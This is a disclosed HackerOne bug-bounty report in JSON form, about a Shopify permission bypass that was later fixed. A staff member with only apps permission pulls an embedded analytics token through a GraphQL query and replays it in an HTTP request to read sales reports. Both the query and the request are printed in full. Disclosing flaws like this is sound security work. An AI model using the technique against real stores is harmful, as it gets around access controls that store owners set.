{"id":901775,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDE3NzU=","url":"https://hackerone.com/reports/901775","title":"Get analytics token using only apps permission","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-18T15:09:34.670Z","submitted_at":"2020-06-18T15:09:34.670Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jmp_35p","url":"/jmp_35p","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-18T21:29:44.758Z","bug_reporter_agreed_on_going_public_at":"2020-08-18T21:29:44.708Z","team_member_agreed_on_going_public_at":"2020-08-18T19:45:15.230Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It seems apps that can read \"analytics\" have embedded analytic token. In order to access the /admin/reportify/token.json endpoint explicit dashboard or reports permission is required. A staff member with just \"apps\" permission can leverage the permissions of apps that can read reports to extract their embedded analyticsToken as long as the appropriate query which is provided below is used. The apikey of the POS app is used here as a variable (see token.png for more).\n\n{\"operationName\":\"EmbeddedAppAnalyticsToken\",\"variables\":{\"apiKey\":\"a53cf2ce9b5dabf5dd222b3615c29569\"},\"query\":\"query EmbeddedAppAnalyticsToken($apiKey:String!){appByKey:appByKey(apiKey:$apiKey){id installation{id legacyEasdkAnalyticsToken __typename}__typename}}\"}\n\nNow, in order to read the store's reports the token gotten from above is used in the query below.\nPOST /validate?beta=true\u0026dataOnly=false HTTP/1.1\nHost: analytics.shopify.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nOrigin: https://foobar.myshopify.com\n\n\nq%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day\u0026source=new-admin\u0026token={token_here}\n\n## Impact\n\nStaff member can perform actions they don't have permission to","vulnerability_information_html":"\u003cp\u003eIt seems apps that can read \u0026quot;analytics\u0026quot; have embedded analytic token. In order to access the /admin/reportify/token.json endpoint explicit dashboard or reports permission is required. A staff member with just \u0026quot;apps\u0026quot; permission can leverage the permissions of apps that can read reports to extract their embedded analyticsToken as long as the appropriate query which is provided below is used. The apikey of the POS app is used here as a variable (see token.png for more).\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;operationName\u0026quot;:\u0026quot;EmbeddedAppAnalyticsToken\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;apiKey\u0026quot;:\u0026quot;a53cf2ce9b5dabf5dd222b3615c29569\u0026quot;},\u0026quot;query\u0026quot;:\u0026quot;query EmbeddedAppAnalyticsToken($apiKey:String!){appByKey:appByKey(apiKey:$apiKey){id installation{id legacyEasdkAnalyticsToken \u003cstrong\u003etypename}\u003c/strong\u003etypename}}\u0026quot;}\u003c/p\u003e\n\n\u003cp\u003eNow, in order to read the store\u0026#39;s reports the token gotten from above is used in the query below.\u003cbr\u003e\nPOST /validate?beta=true\u0026amp;dataOnly=false HTTP/1.1\u003cbr\u003e\nHost: analytics.shopify.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\u003cbr\u003e\nAccept: application/json\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\u003cbr\u003e\nOrigin: \u003ca title=\"https://foobar.myshopify.com\" href=\"/redirect?url=https%3A%2F%2Ffoobar.myshopify.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://foobar.myshopify.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eq%5B%5D=SHOW+orders%2C+gross_sales%2C+discounts%2C+returns%2C+net_sales%2C+shipping%2C+taxes%2C+total_sales+OVER+day+FROM+sales+SINCE+-30d+UNTIL+today+ORDER+BY+day\u0026amp;source=new-admin\u0026amp;token={token_here}\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eStaff member can perform actions they don\u0026#39;t have permission to\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["mygf","yinvi777"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8332599,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:10:35.265Z","updated_at":"2020-06-18T15:10:35.265Z","additional_data":{"old_title":"Get report token using only apps permission","new_title":"Get analytics token using only apps permission"},"actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8336169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmp_35p,\nJust wanted to let you know that we haven't had the chance yet to investigate this issue. Our team is out of the office tomorrow, but we will get back to you early next week. Thank you for your patience!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmp_35p\"\u003e@jmp_35p\u003c/a\u003e,\u003cbr\u003e\nJust wanted to let you know that we haven\u0026#39;t had the chance yet to investigate this issue. Our team is out of the office tomorrow, but we will get back to you early next week. Thank you for your patience!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-18T21:35:29.655Z","updated_at":"2020-06-18T21:35:29.655Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8388933,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @jmp_35p \nthanks for your patience and sorry for our delayed follow up. That said, we were able to reproduce the issue and our engineering team is working on a fix.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmp_35p\"\u003e@jmp_35p\u003c/a\u003e \u003cbr\u003e\nthanks for your patience and sorry for our delayed follow up. That said, we were able to reproduce the issue and our engineering team is working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-23T20:03:37.236Z","updated_at":"2020-06-23T20:03:37.236Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8409597,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding a $1,000 bounty for this issue under the \"Circumvention of user permission model\" category for Shopify Core. We placed this near the lower end of the range for this vulnerability type because the unintended access was read-only, and because an attacker would need to have Apps permission on the store.\n\nWe'll be in touch again once the issue is resolved.","markdown_message":"\u003cp\u003eThanks again for your report. We\u0026#39;re awarding a $1,000 bounty for this issue under the \u0026quot;Circumvention of user permission model\u0026quot; category for Shopify Core. We placed this near the lower end of the range for this vulnerability type because the unintended access was read-only, and because an attacker would need to have Apps permission on the store.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll be in touch again once the issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-25T17:31:49.122Z","updated_at":"2020-06-25T17:31:49.122Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"jmp_35p","url":"/jmp_35p"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8779869,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We recently deployed a fix for this issue. Staff members must now have Reports or Dashboards permission to access the `legacyEasdkAnalyticsToken` field.\n\nWe look forward to hearing from you again soon. Happy hacking!","markdown_message":"\u003cp\u003eWe recently deployed a fix for this issue. Staff members must now have Reports or Dashboards permission to access the \u003ccode\u003elegacyEasdkAnalyticsToken\u003c/code\u003e field.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to hearing from you again soon. Happy hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-28T13:30:05.226Z","updated_at":"2020-07-28T13:30:05.226Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jmp_35p","url":"/jmp_35p"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8779871,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-28T13:30:29.469Z","updated_at":"2020-07-28T13:30:29.469Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":753672,"new_severity_id":802525},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8829887,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is no longer reproducible. ","markdown_message":"\u003cp\u003eThis is no longer reproducible. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-02T19:00:10.669Z","updated_at":"2020-08-02T19:00:10.669Z","actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8972298,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-18T19:45:15.253Z","updated_at":"2020-08-18T19:45:15.253Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8972903,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-18T21:29:44.732Z","updated_at":"2020-08-18T21:29:44.732Z","actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8972904,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-18T21:29:44.785Z","updated_at":"2020-08-18T21:29:44.785Z","actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}